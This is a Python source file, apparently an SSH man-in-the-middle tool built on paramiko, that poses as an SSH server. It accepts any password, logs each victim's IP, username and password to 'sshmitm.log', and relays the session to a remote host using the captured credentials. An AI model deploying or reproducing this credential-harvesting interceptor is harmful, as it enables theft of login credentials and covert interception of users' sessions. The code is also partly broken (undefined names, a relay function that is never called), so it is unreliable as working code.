
from binascii import hexlify
import threading
from threading import Thread
import traceback
import SocketServer
import logging
import paramiko
from paramiko.py3compat import u
import select
import sys

# setup logging
LOG_FILE = 'sshmitm.log'
logger = logging.getLogger("access.log")
paramiko.util.log_to_file("filename.log")
logger.setLevel(logging.INFO)
lh = logging.FileHandler(LOG_FILE)
logger.addHandler(lh)

host_key = paramiko.RSAKey(filename='test_rsa.key')

print('Read key: ' + u(hexlify(host_key.get_fingerprint())))

class Server (paramiko.ServerInterface):

    def __init__(self, client_address):
        self.event = threading.Event()
        self.client_address = client_address

    def check_channel_request(self, kind, chanid):        
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_none(self, username):
        print('check_auth_none')
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        print('IP: %s, User: %s, Password: %s' % (self.client_address[0],
                                                        username, password))
        logger.info('IP: %s, User: %s, Password: %s' % (self.client_address[0],
                                                        username, password))
        self.password = password
        self.username = username
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_shell_request(self, channel):
        print('check_channel_shell_request ')
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height,
                                  pixelwidth, pixelheight, modes):
        print('check_channel_pty_request ')
        return True


class CProxySSH(SocketServer.StreamRequestHandler):
    def negotiate(self):
        self.t = paramiko.Transport(self.connection)
        self.t.add_server_key(host_key)
        server = Server(self.client_address)
        try:
            self.t.start_server(server=server)
            return True
        except paramiko.SSHException:
            print('*** SSH negotiation failed.')
            return False
    
    def acceptClient(self):
        # Authenticate & open channel
        self.in_shell = self.t.accept()
        if self.in_shell is None:
            print('UnAuthorized = closing!')
            self.t.close()
            return False
        print('Authenticated!')
        print(str(self.server.username) + " " + str(self.server.password))
        return True
    
    def openShell(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(self.remote_ip, username=server.username,
                            password=server.password, port=self.remote_port)
        self.out_shell = self.client.invoke_shell()
    
    def runProxy(self):
        while True:
            r, w, e = select.select([self.out_shell, self.in_shell], [], [])
            if self.in_shell in r:
                x = self.in_shell.recv(1024)
                if len(x) == 0:
                    break
                self.out_shell.send(x)
    
            if self.out_shell in r:
                x = self.out_shell.recv(1024)
                if len(x) == 0:
                    break
                self.in_shell.send(x)
    
    def endConnection(self):
        self.server.event.wait(10)
        if not self.server.event.is_set():
            print('*** Client never asked for a shell.')
            self.t.close()
            return
        print(self.server.get_allowed_auths)
        self.in_shell.close()
    
    def handle(self):
        try:
            if not self.negotiate():
                return
            
            if not self.acceptClient():
                return
            
            self.runProxy()
    
            self.endConnection()
        except Exception as e:
            print('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
            traceback.print_exc()
        finally:
            try:
                self.t.close()
            except:
                pass
    
def createThreadProxySSH(proxy_ip, proxy_port):
    try:
        print("Create SSH Proxy THREAD " + str(proxy_ip) + " " + str(proxy_port))
        SocketServer.TCPServer.allow_reuse_address = True
        sshserver = SocketServer.ThreadingTCPServer((proxy_ip, proxy_port), CProxySSH)
        sshserver.serve_forever()
    except KeyboardInterrupt, e:
        sys.exit()

def createProxySSH(proxy_ip, proxy_port):
        print("Create SSH Proxy" + str(proxy_ip) + " " + str(proxy_port))
        thread = Thread(target = createThreadProxySSH, args = (proxy_ip, proxy_port))
        thread.start()


